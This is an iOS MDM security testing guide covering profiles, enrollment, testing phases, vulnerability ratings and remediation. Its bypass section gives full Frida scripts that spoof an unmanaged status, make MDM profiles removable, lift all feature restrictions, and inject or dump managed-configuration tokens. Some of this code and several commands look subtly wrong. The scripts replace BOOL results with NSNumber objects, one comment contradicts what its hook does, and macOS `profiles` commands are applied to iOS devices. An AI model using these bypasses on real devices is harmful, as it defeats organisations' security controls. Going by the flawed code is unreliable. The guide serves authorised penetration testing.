# MDM Security Testing Guide

## Table of Contents

1. [Overview](#overview)
2. [MDM Architecture](#mdm-architecture)
3. [Configuration Profiles](#configuration-profiles)
4. [MDM Enrollment](#mdm-enrollment)
5. [Managed App Configuration](#managed-app-configuration)
6. [Testing Methodology](#testing-methodology)
7. [Bypass Techniques](#bypass-techniques)
8. [Vulnerability Assessment](#vulnerability-assessment)
9. [Remediation](#remediation)
10. [OWASP MASTG References](#owasp-mastg-references)

---

## Overview

Mobile Device Management (MDM) is a critical component of enterprise iOS deployment. MDM allows organizations to configure, secure, and manage devices remotely. This guide covers security testing for MDM implementations, configuration profiles, managed app configurations, and MDM enrollment bypass techniques.

### Why Test MDM Security

MDM security is critical because:
- **Full Device Control**: MDM can install/remove apps, configure Wi-Fi/VPN, and enforce policies
- **Remote Management**: MDM commands can wipe devices, lock devices, or install certificates
- **Privacy Implications**: MDM can track device location, app usage, and network traffic
- **Policy Enforcement**: MDM enforces security policies across all managed devices
- **Compliance Requirements**: MDM is required for regulatory compliance (HIPAA, PCI, etc.)

### MDM Providers

| Provider | Features | Security Considerations |
|----------|----------|------------------------|
| **Jamf Pro** | Comprehensive MDM, Apple-certified | Strong security, detailed logs |
| **Microsoft Intune** | Enterprise mobility, Azure AD integration | OAuth 2.0, conditional access |
| **VMware Workspace ONE** | Multi-platform, digital workspace | Identity management, UEM |
| **Cisco Meraki** | Cloud-based, network-focused | Simple deployment, limited features |
| **Mosyle** | Education-focused, affordable | Simpler UI, limited enterprise features |
| **Apple Configurator** | Local device management, DEP | Manual, no remote management |

---

## MDM Architecture

### MDM Components

```
┌─────────────────────────────────────────────────────────┐
│                   MDM Server                           │
│  - Device enrollment                                    │
│  - Profile management                                   │
│  - Command processing                                   │
│  - Reporting and monitoring                              │
└───────────────────┬─────────────────────────────────────┘
                    │
                    │ (APNS + HTTPS)
                    │
┌───────────────────▼─────────────────────────────────────┐
│                   iOS Device                            │
│  ┌──────────────────────────────────────────────────┐   │
│  │  MDMClient Framework                             │   │
│  │  - Enrollment                                   │   │
│  │  - Command processing                           │   │
│  │  - Profile installation                          │   │
│  │  - Status reporting                              │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Configuration Profiles                           │   │
│  │  - MDM enrollment profile                       │   │
│  │  - Wi-Fi/VPN configuration                       │   │
│  │  - App restrictions                              │   │
│  │  - Certificate enrollment                        │   │
│  └──────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Managed Apps                                    │   │
│  │  - Managed configuration                          │   │
│  │  - App group containers                           │   │
│  │  - Keychain sharing                              │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

### MDM Communication Flow

```
1. Device Enrollment
   ┌─────────┐         ┌─────────┐         ┌─────────┐
   │ Device  │───────▶ │  APNS   │───────▶ │   MDM   │
   │         │◀─────── │ Server  │◀─────── │  Server │
   └─────────┘         └─────────┘         └─────────┘

2. Command Processing
   ┌─────────┐         ┌─────────┐         ┌─────────┐
   │   MDM   │────────▶│ Device  │────────▶│  App    │
   │ Server  │         │         │         │ Install │
   └─────────┘         └─────────┘         └─────────┘

3. Status Reporting
   ┌─────────┐         ┌─────────┐         ┌─────────┘
   │ Device  │────────▶│  APNS   │────────▶│   MDM   │
   │         │         │ Server  │         │  Server │
   └─────────┘         └─────────┘         └─────────┘
```

---

## Configuration Profiles

### Profile Structure

Configuration profiles are XML plists that contain configuration data for iOS devices.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <!-- Multiple payload types -->
        <dict>
            <key>PayloadDescription</key>
            <string>Configures Wi-Fi network</string>
            <key>PayloadDisplayName</key>
            <string>Wi-Fi</string>
            <key>PayloadIdentifier</key>
            <string>com.example.wifi.profile</string>
            <key>PayloadOrganization</key>
            <string>Example Inc.</string>
            <key>PayloadRemovalDisallowed</key>
            <true/>
            <key>PayloadType</key>
            <string>com.apple.wifi.managed</string>
            <key>PayloadUUID</key>
            <string>...</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>SSID_STR</key>
            <string>Corporate Wi-Fi</string>
            <key>HiddenNetwork</key>
            <false/>
            <key>AutoJoin</key>
            <true/>
            <key>EncryptionType</key>
            <string>WPA2Enterprise</string>
            <key>EAPClientConfiguration</key>
            <dict>
                <key>UserName</key>
                <string>$USERNAME</string>
                <key>UserPassword</key>
                <string>$PASSWORD</string>
                <key>TLS</key>
                <dict>
                    <key>PayloadCertificateUUID</key>
                    <string>...</string>
                </dict>
            </dict>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Corporate Configuration</string>
    <key>PayloadIdentifier</key>
    <string>com.example.corporate.profile</string>
    <key>PayloadOrganization</key>
    <string>Example Inc.</string>
    <key>PayloadRemovalDisallowed</key>
    <true/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>...</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
```

### Payload Types

| Payload Type | Purpose | Security Impact |
|--------------|---------|-----------------|
| **com.apple.management** | MDM enrollment | Full device control |
| **com.apple.wifi.managed** | Wi-Fi configuration | Network access control |
| **com.apple.vpn.managed** | VPN configuration | Traffic routing control |
| **com.apple.security.scep** | Certificate enrollment | Certificate trust |
| **com.apple.application-access** | App restrictions | App installation/removal |
| **com.apple.managedsettings** | Content filtering | Content access control |
| **com.apple.passwordpolicy** | Password policy | Authentication security |
| **com.apple.caldav** | Calendar configuration | Data synchronization |
| **com.apple.carddav** | Contacts configuration | Data synchronization |

---

## MDM Enrollment

### Enrollment Types

#### 1. Device Enrollment (DEP)

**Characteristics**:
- Corporate-owned devices
- Supervised device
- Automatic enrollment
- MDM profile cannot be removed

**Enrollment Flow**:
```
1. Device activation
   ┌─────────┐         ┌─────────┐
   │ Device  │────────▶│ Apple   │
   │ Activ.  │         │ Server  │
   └─────────┘         └─────────┘
         │                   │
         │ MDM server URL     │
         │                   │
         ▼                   ▼
   ┌─────────────────────────┐
   │   Enroll in MDM         │
   │   (Supervised device)    │
   └─────────────────────────┘
```

**Detection**:
```bash
# Check device supervision
/usr/bin/profiles show -type enrollment

# Check for DEP enrollment
/usr/bin/profiles list | grep "com.apple.dep"

# Check MDM status
/usr/bin/profiles show -type mdm
```

#### 2. User Enrollment (BYOD)

**Characteristics**:
- User-owned device
- Managed Apple ID
- Separation of personal/corporate data
- MDM profile removable

**Enrollment Flow**:
```
1. User enrolls device
   ┌─────────┐         ┌─────────┐
   │  User   │────────▶│  MDM    │
   │ Device  │         │ Portal  │
   └─────────┘         └─────────┘
         │
         │ Download profile
         │
         ▼
   ┌─────────────────────────┐
   │   Install profile       │
   │   (Managed Apple ID)    │
   └─────────────────────────┘
```

**Detection**:
```bash
# Check for managed Apple ID
/usr/bin/profiles show -type enrollment

# Check managed status
/usr/bin/profiles list | grep "managed"

# Check profile removal
/usr/bin/profiles remove -identifier com.example.mdm.profile
```

### Enrollment Security

**Risks**:
1. **Enrollment Hijacking**: Malicious MDM server enrolls device
2. **Profile Manipulation**: Modified profiles bypass restrictions
3. **Enrollment Bypass**: App bypasses MDM enrollment checks
4. **Profile Removal**: User removes MDM profile (unsupervised)

**Mitigations**:
1. **SCEP Validation**: Validate certificate enrollment
2. **Profile Signing**: Sign profiles with trusted certificate
3. **MDM Server Validation**: Verify MDM server identity
4. **Supervision**: Supervise devices (DEP enrollment)

---

## Managed App Configuration

### Configuration Keys

Managed app configuration allows MDM to configure app behavior.

```swift
// App reads managed configuration
let managedDefaults = UserDefaults(
    suiteName: "com.example.app.managed"
)

let serverURL = managedDefaults.string(forKey: "ServerURL")
let disableAnalytics = managedDefaults.bool(forKey: "DisableAnalytics")
let customLogoURL = managedDefaults.string(forKey: "CustomLogoURL")
```

### Configuration Structure

```xml
<key>com.apple.configuration.managed</key>
<dict>
    <key>ServerURL</key>
    <string>https://internal.company.com/api</string>
    <key>DisableAnalytics</key>
    <true/>
    <key>CustomLogoURL</key>
    <string>https://internal.company.com/logo.png</string>
    <key>APIToken</key>
    <string>sk_live_abc123...</string>
    <key>AllowedDomains</key>
    <array>
        <string>company.com</string>
        <string>partner.com</string>
    </array>
</dict>
```

### Security Risks

1. **Configuration Key Injection**: Malicious app injects configuration keys
2. **Credential Exposure**: API keys/tokens in managed configuration
3. **Configuration Manipulation**: Malicious app modifies configuration
4. **Cross-App Data Access**: Shared configuration exposed to other apps

---

## Testing Methodology

### Phase 1: Profile Analysis

```bash
# 1. List all installed profiles
/usr/bin/profiles list

# 2. Export profile
/usr/bin/profiles export -o /tmp/profile.mobileconfig -identifier com.example.mdm

# 3. Parse profile
plutil -p /tmp/profile.mobileconfig

# 4. Check for sensitive data
cat /tmp/profile.mobileconfig | grep -i "password\|token\|secret"
```

### Phase 2: MDM Enrollment Testing

```bash
# 1. Check enrollment status
/usr/bin/profiles show -type enrollment

# 2. Check MDM status
/usr/bin/profiles show -type mdm

# 3. Check for DEP
/usr/bin/profiles list | grep "com.apple.dep"

# 4. Test profile removal (unsupervised only)
/usr/bin/profiles remove -identifier com.example.mdm.profile
```

### Phase 3: Frida Dynamic Analysis

```bash
# 1. Hook MDM status
frida -U -f com.example.app -l mdm-bypass.js

# 2. Test managed app configuration
frida -U -f com.example.app -l managed-app-inspector.js

# 3. Test app group containers
frida -U -f com.example.app -l app-groups-inspector.js

# 4. Test keychain sharing
frida -U -f com.example.app -l keychain-dumper.js
```

### Phase 4: Vulnerability Verification

```bash
# 1. Test profile manipulation
# Modify profile and re-install
/usr/bin/profiles install -i /tmp/modified-profile.mobileconfig

# 2. Test configuration injection
# Inject malicious configuration keys
# via Frida or modified defaults

# 3. Test MDM bypass
# Hook MDM status and verify bypass
# See assets/frida-scripts/mdm-bypass.js
```

---

## Bypass Techniques

### 1. MDM Status Bypass

**Target**: `MDMClient.isDeviceManaged`

**Frida Script**:
```javascript
// assets/frida-scripts/mdm-bypass.js

if (ObjC.available) {
    console.log("[*] MDM Bypass Script Started");

    // Hook MDMClient.isDeviceManaged
    try {
        var MDMClient = ObjC.classes.MDMClient;

        if (MDMClient) {
            Interceptor.attach(MDMClient['- isDeviceManaged'].implementation, {
                onEnter: function(args) {
                    console.log("[*] MDMClient.isDeviceManaged called");
                },
                onLeave: function(retval) {
                    console.log("[+] Original return: " + retval);
                    retval.replace(ObjC.classes.NSNumber.numberWithBool_(false));
                    console.log("[+] Bypassed return: false (unmanaged)");
                }
            });
            console.log("[+] MDMClient.isDeviceManaged hooked");
        }
    } catch (e) {
        console.log("[!] MDMClient not found: " + e.message);
    }

    // Hook MCProfileConnection
    try {
        var MCProfileConnection = ObjC.classes.MCProfileConnection;

        if (MCProfileConnection) {
            Interceptor.attach(MCProfileConnection['- isManaged'].implementation, {
                onEnter: function(args) {
                    console.log("[*] MCProfileConnection.isManaged called");
                },
                onLeave: function(retval) {
                    console.log("[+] Original return: " + retval);
                    retval.replace(ObjC.classes.NSNumber.numberWithBool_(false));
                    console.log("[+] Bypassed return: false (unmanaged)");
                }
            });
            console.log("[+] MCProfileConnection.isManaged hooked");
        }
    } catch (e) {
        console.log("[!] MCProfileConnection not found: " + e.message);
    }

    // Hook MCFeatureSettings
    try {
        var MCFeatureSettings = ObjC.classes.MCFeatureSettings;

        if (MCFeatureSettings) {
            Interceptor.attach(MCFeatureSettings['+ isFeatureAllowed:error:'].implementation, {
                onEnter: function(args) {
                    console.log("[*] MCFeatureSettings.isFeatureAllowed called");
                    var feature = ObjC.Object(args[2]);
                    console.log("    Feature: " + feature);
                },
                onLeave: function(retval) {
                    console.log("[+] Original return: " + retval);
                    retval.replace(ObjC.classes.NSNumber.numberWithBool_(true));
                    console.log("[+] Bypassed return: true (allowed)");
                }
            });
            console.log("[+] MCFeatureSettings.isFeatureAllowed hooked");
        }
    } catch (e) {
        console.log("[!] MCFeatureSettings not found: " + e.message);
    }

    console.log("[+] MDM bypass hooks installed");
}
```

**Usage**:
```bash
frida -U -f com.example.app -l mdm-bypass.js
```

---

### 2. Profile Removal Bypass

**Target**: Profile removal restrictions

**Technique**:
1. Hook `MCProfileConnection` methods
2. Modify `isRemovable` property
3. Intercept profile deletion checks

**Frida Script**:
```javascript
if (ObjC.available) {
    console.log("[*] Profile Removal Bypass Started");

    // Hook MCProfileConnection.isRemovable
    try {
        var MCProfileConnection = ObjC.classes.MCProfileConnection;

        if (MCProfileConnection) {
            Interceptor.attach(MCProfileConnection['- isRemovable'].implementation, {
                onEnter: function(args) {
                    console.log("[*] MCProfileConnection.isRemovable called");
                },
                onLeave: function(retval) {
                    console.log("[+] Original return: " + retval);
                    retval.replace(ObjC.classes.NSNumber.numberWithBool_(true));
                    console.log("[+] Bypassed return: true (removable)");
                }
            });
            console.log("[+] MCProfileConnection.isRemovable hooked");
        }
    } catch (e) {
        console.log("[!] MCProfileConnection not found: " + e.message);
    }

    console.log("[+] Profile removal bypass hooks installed");
}
```

---

### 3. Managed Configuration Injection

**Target**: `UserDefaults` managed keys

**Frida Script**:
```javascript
// assets/frida-scripts/managed-app-inspector.js

if (ObjC.available) {
    console.log("[*] Managed App Inspector Started");

    // Hook UserDefaults.objectForKey
    try {
        var UserDefaults = ObjC.classes.NSUserDefaults;
        var standardUserDefaults = UserDefaults.standardUserDefaults();

        Interceptor.attach(UserDefaults['- objectForKey:'].implementation, {
            onEnter: function(args) {
                this.key = ObjC.Object(args[2]);
                console.log("[*] UserDefaults.objectForKey: " + this.key);
            },
            onLeave: function(retval) {
                console.log("[+] Value: " + retval);

                // Inject malicious configuration
                if (this.key.toString() === "APIToken") {
                    var maliciousToken = ObjC.classes.NSString.stringWithString_(
                        "sk_live_malicious_token"
                    );
                    retval.replace(maliciousToken);
                    console.log("[+] Injected malicious APIToken");
                }
            }
        });
        console.log("[+] UserDefaults.objectForKey hooked");
    } catch (e) {
        console.log("[!] UserDefaults hook failed: " + e.message);
    }

    // Dump all managed configuration
    try {
        var sharedDefaults = UserDefaults.alloc().initWithSuiteName_(
            "com.example.app.managed"
        );

        if (sharedDefaults) {
            console.log("[+] Managed Configuration Keys:");
            var keys = sharedDefaults.dictionaryRepresentation().allKeys();
            for (var i = 0; i < keys.count(); i++) {
                var key = keys.objectAtIndex_(i);
                var value = sharedDefaults.objectForKey_(key);
                console.log("  " + key + " = " + value);
            }
        }
    } catch (e) {
        console.log("[!] Could not dump managed configuration: " + e.message);
    }

    console.log("[+] Managed app inspector hooks installed");
}
```

**Usage**:
```bash
frida -U -f com.example.app -l managed-app-inspector.js
```

---

### 4. Restrictions Bypass

**Target**: `MCFeatureSettings` feature restrictions

**Frida Script**:
```javascript
// assets/frida-scripts/mdm-bypass.js

if (ObjC.available) {
    console.log("[*] Restrictions Bypass Started");

    // Hook MCFeatureSettings.isFeatureAllowed
    try {
        var MCFeatureSettings = ObjC.classes.MCFeatureSettings;

        if (MCFeatureSettings) {
            Interceptor.attach(MCFeatureSettings['+ isFeatureAllowed:error:'].implementation, {
                onEnter: function(args) {
                    var feature = ObjC.Object(args[2]);
                    this.feature = feature.toString();
                    console.log("[*] MCFeatureSettings.isFeatureAllowed: " + this.feature);
                },
                onLeave: function(retval) {
                    console.log("[+] Original return: " + retval);
                    console.log("[+] Feature: " + this.feature + " was " + (retval ? "allowed" : "restricted"));

                    // Bypass all restrictions
                    retval.replace(ObjC.classes.NSNumber.numberWithBool_(true));
                    console.log("[+] Bypassed return: true (allowed)");
                }
            });
            console.log("[+] MCFeatureSettings.isFeatureAllowed hooked");
        }
    } catch (e) {
        console.log("[!] MCFeatureSettings not found: " + e.message);
    }

    // Hook MCProfileConnection.allowedFeatures
    try {
        var MCProfileConnection = ObjC.classes.MCProfileConnection;

        if (MCProfileConnection) {
            Interceptor.attach(MCProfileConnection['- allowedFeatures'].implementation, {
                onLeave: function(retval) {
                    console.log("[+] MCProfileConnection.allowedFeatures bypassed");
                    // Return all features as allowed
                    var allFeatures = ObjC.classes.NSSet.set();
                    retval.replace(allFeatures);
                }
            });
            console.log("[+] MCProfileConnection.allowedFeatures hooked");
        }
    } catch (e) {
        console.log("[!] MCProfileConnection not found: " + e.message);
    }

    console.log("[+] Restrictions bypass hooks installed");
}
```

**Usage**:
```bash
frida -U -f com.example.app -l mdm-bypass.js
```

---

## Vulnerability Assessment

### 1. MDM Enrollment Bypass

**Severity**: CRITICAL (9.0+)
**CWE**: CWE-284 (Improper Access Control)
**OWASP**: M8 (Security Misconfiguration)

**Detection**:
```bash
// Use assets/frida-scripts/mdm-bypass.js
frida -U -f com.example.app -l mdm-bypass.js
```

**Impact**:
- Complete MDM evasion
- Bypass corporate policies
- Install unauthorized apps
- Disable security restrictions

**Remediation**:
- Implement server-side MDM validation
- Use Apple DeviceCheck API
- Add tamper detection
- Require device attestation

---

### 2. Profile Removal Vulnerability

**Severity**: HIGH (7.5-8.5)
**CWE**: CWE-276 (Incorrect Default Permissions)
**OWASP**: M8 (Security Misconfiguration)

**Detection**:
```bash
# Check if profile is removable
/usr/bin/profiles list | grep "RemovalDisallowed"

# Test removal (unsupervised only)
/usr/bin/profiles remove -identifier com.example.mdm.profile
```

**Impact**:
- User can remove MDM (unsupervised)
- Loss of device control
- Compliance violation

**Remediation**:
- Supervise devices (DEP enrollment)
- Set `PayloadRemovalDisallowed: true`
- Monitor profile status
- Alert on profile removal

---

### 3. Managed Configuration Exposure

**Severity**: HIGH (7.0-8.0)
**CWE**: CWE-200 (Exposure of Sensitive Information)
**OWASP**: M9 (Insecure Data Storage)

**Detection**:
```bash
// Use assets/frida-scripts/managed-app-inspector.js
frida -U -f com.example.app -l managed-app-inspector.js
```

**Impact**:
- Credential exposure (API keys, tokens)
- Sensitive configuration access
- Cross-app data leakage

**Remediation**:
- Remove sensitive data from managed config
- Use secure storage (Keychain)
- Implement configuration validation
- Encrypt sensitive configuration

---

### 4. App Group Container Exposure

**Severity**: HIGH (7.0-8.0)
**CWE**: CWE-200 (Exposure of Sensitive Information)
**OWASP**: M9 (Insecure Data Storage)

**Detection**:
```bash
// Use assets/frida-scripts/app-groups-inspector.js
frida -U -f com.example.app -l app-groups-inspector.js
```

**Impact**:
- Cross-app data access
- Privilege escalation
- Data exfiltration

**Remediation**:
- Use dedicated app groups
- Implement encryption
- Validate access controls
- Use keychain instead of shared containers

---

## Remediation

### MDM Security Best Practices

1. **Device Supervision**:
   ```bash
   # Enroll devices via DEP (automatic supervision)
   # Or supervise via Apple Configurator
   ```

2. **Profile Security**:
   ```xml
   <!-- Sign profiles -->
   <key>PayloadRemovalDisallowed</key>
   <true/>

   <!-- Encrypt sensitive data -->
   <!-- Use SCEP for certificate enrollment -->
   ```

3. **App Group Security**:
   ```bash
   # Use dedicated groups
   # Implement encryption
   # Validate access
   ```

4. **Keychain Security**:
   ```swift
   // Use device-bound accessibility
   kSecAttrAccessibleWhenUnlockedThisDeviceOnly

   // Implement access controls
   // Use Secure Enclave where possible
   ```

---

## OWASP MASTG References

| Test ID | Test Name | MDM Relevance |
|---------|-----------|---------------|
| MASTG-TEST-0002 | Information Gathering | MDM configuration analysis |
| MASTG-TEST-0088 | Local Data Storage | App group container security |
| MASTG-TEST-0135 | Local Data Storage | Keychain sharing security |
| MASTG-TEST-0230 | Platform Interaction | Configuration profile abuse |
| MASTG-TEST-0232 | Platform Interaction | MDM enrollment bypass |

---

**Document Version**: 1.0
**Last Updated**: 2025-04-04
**Author**: DragonJAR SAS
**License**: Apache 2.0
